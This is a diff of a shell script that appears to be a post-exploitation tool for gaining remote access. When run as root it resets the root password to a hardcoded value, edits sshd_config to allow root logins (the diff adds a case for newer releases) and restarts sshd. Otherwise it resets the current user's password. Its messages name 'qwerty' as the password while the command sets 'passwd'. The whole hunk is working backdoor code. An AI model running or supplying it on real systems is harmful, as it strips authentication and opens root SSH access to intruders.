@@ -50,20 +50,24 @@ if [ -z "$1" ]
     then
     echo "-[*] running as root - enabling SSH access for root"
     echo "-[*] resetting password: $USER : qwerty"
-    sudo echo 'root:passwd' | chpasswd
+        sudo echo 'root:passwd' | chpasswd
     echo "-[*] configuring sshd_config to allow root logins"
-    sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config
+        # older releases
+        sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config
+        # newer releases 
+        sed -i 's/PermitRootLogin prohibit-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
+    
     echo "-[!] complete."
   else
     echo "-[*] we are not running as root [$USER]"
     echo "-[*] resetting password : $USER : qwerty"
-    echo "$USER:passwd" | chpasswd
+        echo "$USER:passwd" | chpasswd
     echo "-[!] complete. please be aware that if this user has been denioed SSH access, we wont be able to connect"
 
   fi
   echo "-[*] detecting which ports ssh is availble on"
-  service sshd restart
-  netstat -tpln | egrep '(Proto|ssh)'
+      service sshd restart
+      netstat -tpln | egrep '(Proto|ssh)'
 
 
 
